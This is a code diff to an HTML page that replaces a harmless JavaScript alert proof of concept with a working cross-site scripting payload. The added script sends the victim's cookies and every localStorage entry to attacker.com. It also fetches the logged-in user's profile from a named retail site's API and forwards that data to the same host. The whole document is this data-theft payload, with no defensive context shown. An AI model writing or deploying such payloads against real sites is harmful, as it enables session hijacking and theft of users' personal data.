@@ -1,7 +1,23 @@
 <html>
 <body>
 <script>
-alert("JS_EXECUTED");
+  // Exfiltrate cookies
+  fetch('https://attacker.com/log?cookies=' + encodeURIComponent(document.cookie));
+  
+  // Exfiltrate localStorage
+  let storage = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    let key = localStorage.key(i);
+    storage[key] = localStorage.getItem(key);
+  }
+  fetch('https://attacker.com/log?storage=' + encodeURIComponent(JSON.stringify(storage)));
+  
+  // Make authenticated API call to user profile
+  fetch('https://www.therealreal.com/api/user/profile')
+    .then(r => r.json())
+    .then(data => {
+      fetch('https://attacker.com/log?profile=' + encodeURIComponent(JSON.stringify(data)));
+    });
 </script>
 </body>
 </html>
